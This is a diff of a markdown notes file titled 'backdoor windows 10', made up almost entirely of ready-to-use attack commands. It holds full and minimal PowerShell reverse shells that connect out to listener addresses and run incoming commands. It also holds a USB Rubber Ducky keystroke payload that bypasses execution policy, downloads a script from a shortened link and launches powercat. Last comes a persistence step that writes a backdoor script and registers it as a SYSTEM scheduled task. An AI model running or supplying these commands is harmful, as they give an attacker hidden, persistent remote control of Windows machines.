@@ -1,19 +1,26 @@
-# backdoor windows 10
-
-## full
-// powershell /w 1 /C $a=$env:TEMP; $client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-## minimal
-// powershell /w 1 /C $a=$env:TEMP; $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
-
-
 
 #USB Rubber Ducky
 
 DELAY 5500
 GUI r
 DELAY 700
-STRING powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.0.208 -p 1234 -e powershell
+STRING powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.1.199 -p 9001 -e powershell
 CTRL-SHIFT ENTER
 DELAY 850
 ALT y
+
+
+
+# Backdoor windows 10
+
+## full
+powershell /w 1 /C $a=$env:TEMP; $client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+## minimal
+powershell /w 1 /C $a=$env:TEMP; $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+
+# Persistant
+echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.199 -p 9001 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
+### schtasks /create /f /ru "NT AUTHORITY\SYSTEM" /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /sc onidle /i 1
+schtasks /create /tn "test" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 30
